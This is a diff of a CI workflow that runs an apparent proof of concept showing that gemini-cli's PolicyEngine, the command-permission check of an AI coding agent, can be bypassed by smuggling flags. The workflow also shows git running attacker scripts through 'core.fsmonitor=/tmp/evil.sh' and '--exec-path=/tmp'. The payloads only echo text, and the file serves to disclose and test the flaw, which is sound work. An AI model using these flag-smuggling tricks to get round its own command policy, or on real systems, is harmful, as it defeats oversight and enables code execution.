@@ -28,62 +28,50 @@ jobs:
           cp poc_flag_smuggling.ts \
             gemini-cli/packages/core/src/policy/poc_flag_smuggling.ts
 
-      - name: Part 1 - policy engine bypass (real PolicyEngine, real gemini-cli)
+      - name: Part 1 - policy engine bypass
         run: |
-          LOG="poc-results.log"
+          LOG="$GITHUB_WORKSPACE/poc-results.log"
           {
             echo "======================================================================"
             echo "PART 1 -- PolicyEngine bypass (real code, real CI)"
-            echo "======================================================================"
             echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"
-            echo "Date:   $(cd gemini-cli && git log -1 --format='%ci')"
-            echo ""
+            echo "======================================================================"
           } | tee -a "$LOG"
-
-          {
-            echo "## gemini-poc results"
-            echo '```'
-          } >> "$GITHUB_STEP_SUMMARY"
 
           cd gemini-cli
           npx tsx packages/core/src/policy/poc_flag_smuggling.ts 2>&1 \
-            | tee -a "../$LOG" \
-            >> "$GITHUB_STEP_SUMMARY"
-          cd ..
-
-          echo '```' >> "$GITHUB_STEP_SUMMARY"
+            | tee -a "$LOG"
 
       - name: Part 2 - attacker script actually executes
         run: |
-          LOG="poc-results.log"
+          LOG="$GITHUB_WORKSPACE/poc-results.log"
           {
             echo ""
             echo "======================================================================"
-            echo "PART 2 -- attacker script actually executes (not just a policy label)"
+            echo "PART 2 -- attacker script actually executes"
             echo "======================================================================"
           } | tee -a "$LOG"
 
-          git init /tmp/testrepo 2>/dev/null
-          cd /tmp/testrepo
+          mkdir -p /tmp/testrepo && cd /tmp/testrepo
+          git init -q
+          git config user.email "poc@test.com"
+          git config user.name "PoC"
+          echo "tracked" > file.txt
+          git add file.txt
+          git commit -q -m "init"
 
-          printf '#!/bin/sh\necho "[ATTACKER EXECUTED via core.fsmonitor] user=$(id -un) pwd=$(pwd)"\necho "[ATTACKER EXECUTED] This is real code execution triggered by git."\n' \
-            > /tmp/evil.sh
-          chmod +x /tmp/evil.sh
+          printf '#!/bin/sh\necho "[ATTACKER EXECUTED via core.fsmonitor] user=$(id -un)"\n' \
+            > /tmp/evil.sh && chmod +x /tmp/evil.sh
 
-          echo "--- Running: git -c core.fsmonitor=/tmp/evil.sh status ---" \
-            | tee -a "$GITHUB_WORKSPACE/$LOG"
-          git -c core.fsmonitor=/tmp/evil.sh status 2>&1 \
-            | tee -a "$GITHUB_WORKSPACE/$LOG" || true
-          echo "" | tee -a "$GITHUB_WORKSPACE/$LOG"
+          echo "--- git -c core.fsmonitor=/tmp/evil.sh status ---" | tee -a "$LOG"
+          git -c core.fsmonitor=/tmp/evil.sh status 2>&1 | tee -a "$LOG" || true
+          echo "" | tee -a "$LOG"
 
-          printf '#!/bin/sh\necho "[ATTACKER git-status EXECUTED via --exec-path] Replaced real git-status."\n' \
-            > /tmp/git-status
-          chmod +x /tmp/git-status
+          printf '#!/bin/sh\necho "[ATTACKER git-status via --exec-path] ran instead of real git-status"\n' \
+            > /tmp/git-status && chmod +x /tmp/git-status
 
-          echo "--- Running: git --exec-path=/tmp status ---" \
-            | tee -a "$GITHUB_WORKSPACE/$LOG"
-          git --exec-path=/tmp status 2>&1 \
-            | tee -a "$GITHUB_WORKSPACE/$LOG" || true
+          echo "--- git --exec-path=/tmp status ---" | tee -a "$LOG"
+          git --exec-path=/tmp status 2>&1 | tee -a "$LOG" || true
 
       - name: Upload log
         if: always()
